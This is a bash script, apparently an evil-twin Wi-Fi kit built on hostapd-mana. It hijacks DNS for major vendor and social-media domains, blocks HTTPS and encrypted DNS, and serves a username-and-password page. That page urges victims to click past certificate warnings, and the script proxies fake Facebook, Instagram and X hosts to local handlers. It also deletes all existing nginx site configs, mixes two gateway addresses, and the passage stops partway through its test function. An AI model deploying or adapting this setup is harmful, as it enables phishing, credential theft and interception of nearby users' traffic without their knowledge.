#!/bin/bash

GATEWAY="192.168.4.1"
NETMASK="/24"
DNSMASQ_CONF="/home/rakasatryo/hostdirect/nginx/configs/dnsmasq.conf"
HOSTAPD_CONF="/home/rakasatryo/hostdirect/nginx/configs/hostapd.conf"
NODE_APP="/home/agent6/autoredirect/captive/start-server.sh"
HOSTAPD_DIR="/home/agent6/autoredirect/hostapd"
INTERNET_IFACE="eth0"  # Sesuaikan dengan interface internet Anda
AUTH_PAGE="/auth.html"    # Halaman autentikasi Anda
AGGRESSIVE_HSTS_MODE=true
CRITICAL_DOMAINS=(
    "captive.apple.com"
    "captive.g.aaplimg.com"
    "captive-cdn.origin-apple.com.akadns.net"
    "captive-cidr.origin-apple.com.akadns.net"
    "www.apple.com"
    "www.appleiphonecell.com"
    "www.airport.us"
    "www.ibook.info"
    "www.itools.info"
    "www.thinkdifferent.us"
    "apple.com"
    "www.apple.com/library/test/success.html"
    "appleiphonecell.com"
    "airport.us"
    "ibook.info"
    "itools.info"
    "thinkdifferent.us"
    
    # Samsung captive domains - PENTING untuk Samsung devices
    "connectivity.samsung.com"
    "connectivitycheck.samsung.com"
    "samsung.com"
    "www.samsung.com"
    
    # Chrome captive domains - PENTING untuk Chrome
    "clients3.google.com"
    "clients4.google.com"
    "connectivitycheck.gstatic.com"
    "www.google.com"
    "www.gstatic.com"
    
    # Windows captive
    "msftconnecttest.com"
    "www.msftncsi.com"
    
    # Firefox captive
    "detectportal.firefox.com"
    
    # Android captive
    "connectivitycheck.android.com"
    "android.clients.google.com"
    "d2uzsrnmmf6tds.cloudfront.net"
    
    # Domain umum untuk captive portal detection
    "neverssl.com"
)
# === Fungsi Deteksi Interface RTL8814AU ===
detect_rtl8814au_interface() {
    local interfaces=$(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')
    
    for iface in $interfaces; do
        # Cek driver info
        local driver_info=$(ethtool -i "$iface" 2>/dev/null | grep -i "driver\|firmware" | grep -i "8814\|rtl" 2>/dev/null)
        
        if [ -z "$driver_info" ]; then
            # Cek dengan dmesg sebagai fallback
            driver_info=$(dmesg 2>/dev/null | grep -i "$iface" | grep -i "8814\|rtl8814au" 2>/dev/null)
        fi
        
        if [ -n "$driver_info" ]; then
            echo "$iface"
            return 0
        fi
        
        # Cek pattern interface RTL8814AU
        if [[ "$iface" =~ ^wlx[0-9a-f]{12}$ ]]; then
            if [ -L "/sys/class/net/$iface/device" ]; then
                local device_path=$(readlink -f "/sys/class/net/$iface/device")
                if [[ "$device_path" =~ usb ]]; then
                    echo "$iface"
                    return 0
                fi
            fi
        fi
    done
    
    return 1
}
# === Fungsi Deteksi Path hostapd ===
detect_hostapd_path() {
    local possible_paths=(
        "/home/agent6/autoredirect/hostapd"
        "$HOME/hostapd-mana/hostapd"
        "/root/hostapd-mana/hostapd"
        "/opt/hostapd-mana/hostapd"
    )
    
    for path in "${possible_paths[@]}"; do
        if [ -d "$path" ] && [ -f "$path/hostapd" ]; then
            echo "$path"
            return 0
        fi
    done
    
    local found_path=$(find /home /root /opt -name "hostapd" -path "*/hostapd-mana/hostapd/*" 2>/dev/null | head -1 | xargs dirname 2>/dev/null)
    if [ -n "$found_path" ] && [ -d "$found_path" ]; then
        echo "$found_path"
        return 0
    fi
    
    return 1
}
# === Konfigurasi Dnsmasq dengan Pendekatan Universal ===
configure_dnsmasq_universal() {
    echo "[*] 🌐 Menulis konfigurasi dnsmasq (Universal for Apple, Samsung, Chrome)..."
    
    cat > $DNSMASQ_CONF <<EOF
interface=$IFACE
dhcp-range=192.168.4.10,192.168.4.100,12h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
bind-interfaces
no-resolv
filterwin2k
bogus-priv
stop-dns-rebind
server=8.8.8.8
# Apple captive domains - PENTING untuk iPhone/iPad/Mac
address=/captive.apple.com/$GATEWAY
address=/captive.g.aaplimg.com/$GATEWAY
address=/captive-cdn.origin-apple.com.akadns.net/10.235.100.1
address=/captive-cidr.origin-apple.com.akadns.net/10.235.100.1
address=/www.apple.com/10.235.100.1
address=/www.appleiphonecell.com/10.235.100.1
address=/www.airport.us/10.235.100.1
address=/www.ibook.info/10.235.100.1
address=/www.itools.info/10.235.100.1
address=/www.thinkdifferent.us/10.235.100.1
address=/apple.com/10.235.100.1
address=/www.apple.com/library/test/success.html/10.235.100.1
address=/appleiphonecell.com/10.235.100.1
address=/airport.us/10.235.100.1
address=/ibook.info/10.235.100.1
address=/itools.info/10.235.100.1
address=/thinkdifferent.us/10.235.100.1
# Samsung captive domains - PENTING untuk Samsung devices
address=/connectivity.samsung.com/10.235.100.1
address=/connectivitycheck.samsung.com/10.235.100.1
address=/samsung.com/10.235.100.1
address=/www.samsung.com/10.235.100.1
# Chrome captive domains - PENTING untuk Chrome
address=/clients3.google.com/10.235.100.1
address=/clients4.google.com/10.235.100.1
address=/connectivitycheck.gstatic.com/10.235.100.1
address=/www.google.com/10.235.100.1
address=/www.gstatic.com/10.235.100.1
# Windows captive
address=/msftconnecttest.com/10.235.100.1
address=/www.msftncsi.com/10.235.100.1
# Firefox captive
address=/detectportal.firefox.com/10.235.100.1
# Android captive
address=/connectivitycheck.android.com/10.235.100.1
address=/android.clients.google.com/10.235.100.1
address=/d2uzsrnmmf6tds.cloudfront.net/10.235.100.1
# Domain umum untuk captive portal detection
address=/neverssl.com/10.235.100.1
# Catch-all redirect (redirect semua domain lain ke portal)
# Catch-all redirect to gateway (portal)
address=/#/$GATEWAY
# Additional settings for all devices
dhcp-option=252,"http://$GATEWAY"  # WPAD URL
dhcp-option=15,"wifi.portal"  # DNS suffix
# Logging
log-queries
log-dhcp
log-facility=/var/log/dnsmasq.log
EOF
}
# === Setup iptables dengan Pendekatan Universal ===
setup_iptables_universal() {
    echo "[*] 🌐 Apply iptables rules (Universal for Apple, Samsung, Chrome)..."
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Flush old rules
    iptables -F
    iptables -t nat -F
    iptables -X
    
    # Set default policy ke ACCEPT
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    
    # NAT for internet sharing
    iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
    iptables -A FORWARD -i "$IFACE" -o "$INTERNET_IFACE" -j ACCEPT
    iptables -A FORWARD -i "$INTERNET_IFACE" -o "$IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    
    # Allow DHCP & DNS dari client
    iptables -A INPUT -i "$IFACE" -p udp --dport 67:68 --sport 67:68 -j ACCEPT
    iptables -A INPUT -i "$IFACE" -p udp --dport 53 -j ACCEPT
    iptables -A INPUT -i "$IFACE" -p tcp --dport 53 -j ACCEPT
    
    # Allow captive portal (HTTP/HTTPS)
    iptables -A INPUT -i "$IFACE" -p tcp --dport 80 -j ACCEPT
    iptables -A INPUT -i "$IFACE" -p tcp --dport 443 -j ACCEPT
    
    # Loopback untuk local services
    iptables -I INPUT -i lo -j ACCEPT
    
    # Redirect semua HTTP client → captive portal (port 80)
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-ports 80
    
    # Redirect semua DNS (UDP/TCP 53) ke DNS lokal (10.235.100.1)
    iptables -t nat -A PREROUTING -i "$IFACE" -p udp --dport 53 -j REDIRECT --to-port 53
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 53 -j REDIRECT --to-port 53
    
    # Block DNS over TLS/HTTPS (port 853)
    iptables -A FORWARD -i "$IFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
    iptables -A FORWARD -i "$IFACE" -p udp --dport 853 -j REJECT
    
    # Allow ICMP untuk semua devices
    iptables -A INPUT -i "$IFACE" -p icmp --icmp-type echo-request -j ACCEPT
    iptables -A INPUT -i "$IFACE" -p icmp --icmp-type echo-reply -j ACCEPT
    
    # AGGRESSIVE HSTS HANDLING
    if [ "$AGGRESSIVE_HSTS_MODE" = true ]; then
        echo "    → 🔒 AGGRESSIVE MODE: Blocking all HTTPS with TCP RST"
        
        # Blokir SEMUA HTTPS dengan TCP RST untuk trigger captive portal detection
        iptables -A FORWARD -i "$IFACE" -p tcp --dport 443 -j REJECT --reject-with tcp-reset
        
        # Tapi allow traffic ke gateway untuk captive portal
        iptables -A FORWARD -i "$IFACE" -d $GATEWAY -j ACCEPT
        
        # Blokir port HTTPS alternatif
        iptables -A FORWARD -i "$IFACE" -p tcp --dport 8443 -j REJECT --reject-with tcp-reset
        iptables -A FORWARD -i "$IFACE" -p tcp --dport 4443 -j REJECT --reject-with tcp-reset
        iptables -A FORWARD -i "$IFACE" -p tcp --dport 9443 -j REJECT --reject-with tcp-reset
        
        # Blokir QUIC (UDP port 443) untuk mencegah bypass
        iptables -A FORWARD -i "$IFACE" -p udp --dport 443 -j REJECT --reject-with port-unreach
        
        # Blokir HTTP/2 (UDP port 80) untuk mencegah bypass
        iptables -A FORWARD -i "$IFACE" -p udp --dport 80 -j REJECT --reject-with port-unreach
        
        # Tambahkan aturan khusus untuk menangani halaman blank
        # Redirect HTTP request dari domain HSTS ke halaman khusus
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: youtube.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: www.youtube.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: facebook.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: www.facebook.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: instagram.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -m string --string "Host: www.instagram.com" --algo bm -j DNAT --to-destination $GATEWAY:80
        
    else
        echo "    → 🔒 HYBRID MODE: Redirecting HTTPS to local SSL"
        # Redirect semua HTTPS ke port 443 lokal
        iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j DNAT --to-destination $GATEWAY:443
        
        # Allow traffic ke gateway
        iptables -A FORWARD -i "$IFACE" -d $GATEWAY -j ACCEPT
    fi
    
    # Blokir port lain yang mungkin digunakan untuk bypass
    iptables -A FORWARD -i "$IFACE" -p tcp --dport 8000 -j REJECT --reject-with tcp-reset
    iptables -A FORWARD -i "$IFACE" -p tcp --dport 8080 -j REJECT --reject-with tcp-reset
    iptables -A FORWARD -i "$IFACE" -p tcp --dport 8888 -j REJECT --reject-with tcp-reset
    
    echo "[*] Captive portal iptables rules applied! (AP: $IFACE, Internet: $INTERNET_IFACE, Port: 80)"
}
# === Konfigurasi Nginx untuk Semua Devices (AGGRESSIVE FIX VERSION) ===
configure_nginx_universal() {
    echo "[*] 🌐 Configuring nginx for Apple, Samsung, and Chrome..."
    
    local nginx_conf="/etc/nginx/sites-available/default"
    local nginx_conf_backup="/etc/nginx/sites-available/default.backup.$(date +%s)"
    
    # Backup konfigurasi lama
    if [ -f "$nginx_conf" ]; then
        cp "$nginx_conf" "$nginx_conf_backup"
        echo "    → Backed up existing nginx config to $nginx_conf_backup"
    fi
    
    # Hapus semua konfigurasi nginx yang ada
    rm -f /etc/nginx/sites-enabled/*
    rm -f /etc/nginx/sites-available/*
    
    # Buat konfigurasi baru yang bersih untuk captive portal utama
    cat > "$nginx_conf" <<EOF
# Portal utama (akses langsung via IP / portal.local)
server {
    listen 80;
    server_name portal.local $GATEWAY localhost;
    root /var/www/html;
    index $AUTH_PAGE;
    location / {
        try_files \$uri \$uri/ $AUTH_PAGE;
    }
}

# Captive portal detection - Universal (URUTAN PENTING!)
server {
    listen 80;
    server_name
        captive.apple.com
        captive.g.aaplimg.com
        captive-cdn.origin-apple.com.akadns.net
        captive-cidr.origin-apple.com.akadns.net
        www.apple.com
        www.appleiphonecell.com
        www.airport.us
        www.ibook.info
        www.itools.info
        www.thinkdifferent.us
        apple.com
        appleiphonecell.com
        airport.us
        ibook.info
        itools.info
        thinkdifferent.us
        connectivity.samsung.com
        connectivitycheck.samsung.com
        samsung.com
        www.samsung.com
        clients3.google.com
        clients4.google.com
        connectivitycheck.gstatic.com
        www.gstatic.com
        connectivitycheck.android.com
        android.clients.google.com
        d2uzsrnmmf6tds.cloudfront.net
        msftconnecttest.com
        www.msftncsi.com
        detectportal.firefox.com
        neverssl.com;
    
    # Apple iOS Captive Portal Detection - HARUS 200 (bukan 302)
    location = /hotspot-detect.html {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 200 "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
    }
    
    # Apple Success Page - HARUS 200 (bukan 302)
    location = /library/test/success.html {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 200 "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
    }
    
    # Chrome Captive Portal Detection - HARUS 204 (bukan 302)
    location = /generate_204 {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 204 "";
    }
    
    location = /gen_204 {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 204 "";
    }
    
    # Samsung Captive Portal Detection - HARUS 204 (bukan 302)
    location = /samsung/generate_204 {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 204 "";
    }
    
    # Windows NCSI
    location = /ncsi.txt {
        add_header Content-Type text/plain;
        return 200 "Microsoft NCSI";
    }
    
    # Firefox - HARUS 302 (bukan 200)
    location = /success.txt { 
        return 302 http://10.235.100.1$AUTH_PAGE; 
    }
    
    # Default → redirect ke /auth.html
    location / { 
        return 302 http://$GATEWAY$AUTH_PAGE; 
    }
}

# Server khusus untuk menangani domain HSTS yang menyebabkan halaman blank
server {
    listen 80;
    server_name 
        youtube.com 
        www.youtube.com 
        facebook.com 
        www.facebook.com 
        instagram.com 
        www.instagram.com 
        twitter.com 
        www.twitter.com 
        x.com 
        www.x.com 
        google.com 
        www.google.com 
        gmail.com 
        www.gmail.com;
    
    # Redirect langsung ke halaman autentikasi dengan status 200
    location / {
        add_header Cache-Control no-cache;
        add_header Content-Type text/html;
        return 200 "<html><head><script>window.location.href='http://$GATEWAY$AUTH_PAGE';</script></head><body><h2>Redirecting to WiFi Login...</h2><p>If you are not redirected automatically, <a href='http://$GATEWAY$AUTH_PAGE'>click here</a>.</p></body></html>";
    }
}

# Konfigurasi untuk Facebook captive portal
server {
    listen 80;
    server_name fb.internal.local www.fb.internal.local;
    
    access_log /var/log/nginx/fb.access.log;
    error_log /var/log/nginx/fb.error.log;
    
    # If captive_auth cookie present, proxy to internal social handler; else redirect to auth
    location / {
        if (\$http_cookie !~* "captive_auth=1") {
            return 302 http://$GATEWAY$AUTH_PAGE;
        }
        proxy_pass http://$GATEWAY:3000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}

# Konfigurasi untuk Instagram captive portal
server {
    listen 80;
    server_name instagram.internal.local www.instagram.internal.local;
    
    access_log /var/log/nginx/instagram.access.log;
    error_log /var/log/nginx/instagram.error.log;
    
    location / {
        if (\$http_cookie !~* "captive_auth=1") {
            return 302 http://$GATEWAY$AUTH_PAGE;
        }
        proxy_pass http://$GATEWAY:3002;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}

# Konfigurasi untuk X captive portal
server {
    listen 80;
    server_name xcom.internal.local www.xcom.internal.local;
    
    access_log /var/log/nginx/xcom.access.log;
    error_log /var/log/nginx/xcom.error.log;
    
    location / {
        if (\$http_cookie !~* "captive_auth=1") {
            return 302 http://$GATEWAY$AUTH_PAGE;
        }
        proxy_pass http://$GATEWAY:3001;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}

# Catch-all HTTP untuk semua domain lain
server {
    listen 80 default_server;
    server_name _;
    location / {
        return 302 http://10.235.100.1$AUTH_PAGE;
    }
}

# HTTPS (cert mismatch → user akan lihat warning, normal)
server {
    listen 443 ssl default_server;
    ssl_certificate     /etc/ssl/certs/captive.crt;
    ssl_certificate_key /etc/ssl/private/captive.key;
    server_name _;
    # HSTS configuration untuk mencegah masalah setelah kunjungan pertama
    add_header Strict-Transport-Security "max-age=0; includeSubDomains; preload";
    location / {
        add_header Content-Type text/html;
    return 200 "<html><head><meta http-equiv='refresh' content='0; url=http://$GATEWAY$AUTH_PAGE'/></head><body>Redirecting...</body></html>";
    }
}
EOF
    
    # Enable site
    ln -sf "$nginx_conf" /etc/nginx/sites-enabled/default
    
    echo "[*] ✅ Nginx configured for Apple, Samsung, and Chrome"
}
# === Buat File Khusus untuk Semua Devices (AGGRESSIVE CLEAN VERSION) ===
create_device_files() {
    echo "[*] 🌐 Creating device-specific files..."
    
    local portal_dir="/var/www/html"
    mkdir -p "$portal_dir/library/test"
    mkdir -p "$portal_dir/samsung"
    
    # HAPUS SEMUA FILE YANG MENGHAMBAT ENDPOINT
    echo "    → Aggressively cleaning conflicting files..."
    rm -f "$portal_dir/generate_204"
    rm -f "$portal_dir/gen_204"
    rm -f "$portal_dir/samsung/generate_204"
    rm -f "$portal_dir/success.txt"
    rm -f "$portal_dir/index.html"
    rm -f "$portal_dir/index.htm"
    
    # Buat file hotspot-detect.html untuk Apple
    cat > "$portal_dir/hotspot-detect.html" <<EOF
<HTML>
<HEAD>
<TITLE>Success</TITLE>
</HEAD>
<BODY>
Success
</BODY>
</HTML>
EOF
    
    # Buat file success.html untuk Apple
    cat > "$portal_dir/library/test/success.html" <<EOF
<HTML>
<HEAD>
<TITLE>Success</TITLE>
</HEAD>
<BODY>
Success
</BODY>
</HTML>
EOF
    
    # Buat file ncsi.txt untuk Windows
    cat > "$portal_dir/ncsi.txt" <<EOF
Microsoft NCSI
EOF
    
    echo "[*] ✅ Device-specific files created (aggressively cleaned conflicting files)"
}
# === Cek File Auth.html ===
check_auth_page() {
    local auth_file="/var/www/html$AUTH_PAGE"
    
    if [ ! -f "$auth_file" ]; then
        echo "[!] ⚠️ File $AUTH_PAGE tidak ditemukan di /var/www/html"
        echo "[*] Membuat file $AUTH_PAGE sederhana..."
        
        mkdir -p "$(dirname "$auth_file")"
        cat > "$auth_file" <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Authentication</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #555;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: background 0.3s;
        }
        button:hover {
            background: #3367d6;
        }
        .notice {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            color: #856404;
        }
        .device-tabs {
            display: flex;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }
        .device-tab {
            flex: 1;
            padding: 10px;
            cursor: pointer;
            text-align: center;
            border-bottom: 2px solid transparent;
            transition: all 0.3s ease;
        }
        .device-tab.active {
            border-bottom: 2px solid #4285f4;
            color: #4285f4;
            font-weight: bold;
        }
        .device-content {
            display: none;
            text-align: left;
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
        .device-content.active {
            display: block;
        }
        .device-content ol {
            padding-left: 20px;
        }
        .device-content li {
            margin-bottom: 8px;
        }
        .hsts-warning {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Authentication</h1>
        
        <div class="hsts-warning">
            <strong>⚠️ Important:</strong> If you were trying to access a website like YouTube, Facebook, or Instagram and see this page, you need to authenticate first. This is normal behavior for secure websites.
        </div>
        
        <div class="notice">
            <strong>Notice:</strong> After authentication, you'll be able to access all websites normally.
        </div>
        
        <div class="device-tabs">
            <div class="device-tab active" onclick="showDevice('apple')">Apple</div>
            <div class="device-tab" onclick="showDevice('samsung')">Samsung</div>
            <div class="device-tab" onclick="showDevice('chrome')">Chrome</div>
            <div class="device-tab" onclick="showDevice('other')">Other</div>
        </div>
        
        <div id="apple" class="device-content active">
            <h3>Apple Device Instructions:</h3>
            <ol>
                <li>Enter your credentials below</li>
                <li>After authentication, try accessing your website again</li>
                <li>If you still see a security warning, click "Show Details" then "Visit Website"</li>
                <li>If captive portal doesn't appear automatically, try accessing neverssl.com</li>
            </ol>
        </div>
        
        <div id="samsung" class="device-content">
            <h3>Samsung Device Instructions:</h3>
            <ol>
                <li>Enter your credentials below</li>
                <li>After authentication, try accessing your website again</li>
                <li>If you still see a security warning, click "Advanced Settings" then "Continue"</li>
                <li>If captive portal doesn't appear automatically, try turning WiFi off and on again</li>
            </ol>
        </div>
        
        <div id="chrome" class="device-content">
            <h3>Chrome Browser Instructions:</h3>
            <ol>
                <li>Enter your credentials below</li>
                <li>After authentication, try accessing your website again</li>
                <li>If you still see a security warning, click "Advanced" then "Proceed"</li>
                <li>If captive portal doesn't appear automatically, try accessing neverssl.com</li>
            </ol>
        </div>
        
        <div id="other" class="device-content">
            <h3>Other Device Instructions:</h3>
            <ol>
                <li>Enter your credentials below</li>
                <li>After authentication, try accessing your website again</li>
                <li>If you still see a security warning, look for "Advanced" or "Details" option</li>
                <li>If captive portal doesn't appear automatically, try accessing neverssl.com</li>
            </ol>
        </div>
        
        <form id="authForm">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
    </div>
    <script>
        function showDevice(device) {
            // Hide all device contents
            document.querySelectorAll('.device-content').forEach(content => {
                content.classList.remove('active');
            });
            
            // Remove active class from all tabs
            document.querySelectorAll('.device-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected device content
            document.getElementById(device).classList.add('active');
            
            // Add active class to selected tab
            event.target.classList.add('active');
        }
        
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();

            // Simulasi autentikasi
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                // Set cookie captive_auth=1 untuk menandai device sudah authenticate (history)
                document.cookie = "captive_auth=1; path=/; max-age=" + (60*60*24*7) + ";";
                // Redirect ke halaman sukses
                window.location.href = '/success.html';
            }
        });
    </script>
</body>
</html>
EOF
        echo "[*] ✅ File $AUTH_PAGE telah dibuat"
    else
        echo "[*] ✅ File $AUTH_PAGE sudah ada"
    fi
}
# === Buat Halaman Sukses ===
create_success_page() {
    local success_file="/var/www/html/success.html"
    
    if [ ! -f "$success_file" ]; then
        cat > "$success_file" <<'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connection Successful</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            color: #4CAF50;
            margin-bottom: 20px;
        }
        .icon {
            font-size: 64px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
        }
        button:hover {
            background: #45a049;
        }
        .instructions {
            background: #e8f5e9;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
            color: #2e7d32;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✓</div>
        <h1>Connection Successful!</h1>
        <p>You are now connected to the internet. You can close this window and continue browsing.</p>
        
        <div class="instructions">
            <strong>Next steps:</strong><br>
            1. Go back to your browser and refresh the page<br>
            2. You should now be able to access all websites<br>
            3. If you still see issues, try clearing your browser cache
        </div>
        
        <button onclick="window.close()">Close Window</button>
    </div>
</body>
</html>
EOF
        echo "[*] ✅ Success page created"
    fi
}
# === Test Endpoint Accessibility ===
test_endpoints() {
    echo "[*] 🧪 Testing captive portal endpoints..."
    
    # Wait a moment for services to start
    sleep 3
    
    # Test Apple endpoint
    echo "    → Testing Apple hotspot-detect.html..."
    local apple_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/hotspot-detect.html 2>/dev/null)
    if [ "$apple_response" = "200" ]; then
        echo "    ✅ Apple hotspot-detect.html: HTTP $apple_response (CORRECT)"
    else
        echo "    ❌ Apple hotspot-detect.html: HTTP $apple_response (EXPECTED 200)"
    fi
    
    # Test Apple success page
    echo "    → Testing Apple library/test/success.html..."
    local apple_success_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/library/test/success.html 2>/dev/null)
    if [ "$apple_success_response" = "200" ]; then
        echo "    ✅ Apple success.html: HTTP $apple_success_response (CORRECT)"
    else
        echo "    ❌ Apple success.html: HTTP $apple_success_response (EXPECTED 200)"
    fi
    
    # Test Chrome endpoint
    echo "    → Testing Chrome generate_204..."
    local chrome_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/generate_204 2>/dev/null)
    if [ "$chrome_response" = "204" ]; then
        echo "    ✅ Chrome generate_204: HTTP $chrome_response (CORRECT)"
    else
        echo "    ❌ Chrome generate_204: HTTP $chrome_response (EXPECTED 204)"
    fi
    
    # Test Samsung endpoint
    echo "    → Testing Samsung generate_204..."
    local samsung_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/samsung/generate_204 2>/dev/null)
    if [ "$samsung_response" = "204" ]; then
        echo "    ✅ Samsung generate_204: HTTP $samsung_response (CORRECT)"
    else
        echo "    ❌ Samsung generate_204: HTTP $samsung_response (EXPECTED 204)"
    fi
    
    # Test Windows endpoint
    echo "    → Testing Windows ncsi.txt..."
    local windows_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/ncsi.txt 2>/dev/null)
    if [ "$windows_response" = "200" ]; then
        echo "    ✅ Windows ncsi.txt: HTTP $windows_response (CORRECT)"
    else
        echo "    ❌ Windows ncsi.txt: HTTP $windows_response (EXPECTED 200)"
    fi
    
    # Test Firefox endpoint
    echo "    → Testing Firefox success.txt..."
    local firefox_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/success.txt 2>/dev/null)
    if [ "$firefox_response" = "302" ]; then
        echo "    ✅ Firefox success.txt: HTTP $firefox_response (CORRECT)"
    else
        echo "    ❌ Firefox success.txt: HTTP $firefox_response (EXPECTED 302)"
    fi
    
    # Test auth page
    echo "    → Testing Auth page..."
    local auth_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/auth.html 2>/dev/null)
    if [ "$auth_response" = "200" ]; then
        echo "    ✅ Auth page: HTTP $auth_response (CORRECT)"
    else
        echo "    ❌ Auth page: HTTP $auth_response (EXPECTED 200)"
    fi
    
    # Test success page
    echo "    → Testing Success page..."
    local success_response=$(curl -s -o /dev/null -w "%{http_code}" http://10.235.100.1/success.html 2>/dev/null)
    if [ "$success_response" = "200" ]; then
        echo "    ✅ Success page: HTTP $success_response (CORRECT)"
    else
        echo "    ❌ Success page: HTTP $success_response (EXPECTED 200)"
    fi
    
    # Test domain redirects
    echo "    → Testing domain redirects..."
    local domain_test=$(curl -s -o /dev/null -w "%{http_code}" http://captive.apple.com 2>/dev/null)
    if [ "$domain_test" = "302" ]; then
        echo "    ✅ Domain redirect: HTTP $domain_test (CORRECT)"
    else
        echo "    ❌ Domain redirect: HTTP $domain_test (EXPECTED 302)"
    fi
    
    # Test YouTube redirect (khusus untuk masalah halaman blank)
    echo "    → Testing YouTube redirect..."
    local youtube_test=$(curl -s -o /dev/null -w "%{http_code}" http://youtube.com 2>/dev/null)
    if [ "$youtube_test" = "200" ]; then
        echo "    ✅ YouTube redirect: HTTP $youtube_test (CORRECT)"
    else
        echo "    ❌ YouTube redirect: HTTP $youtube_test (EXPECTED 200)"
    fi
    
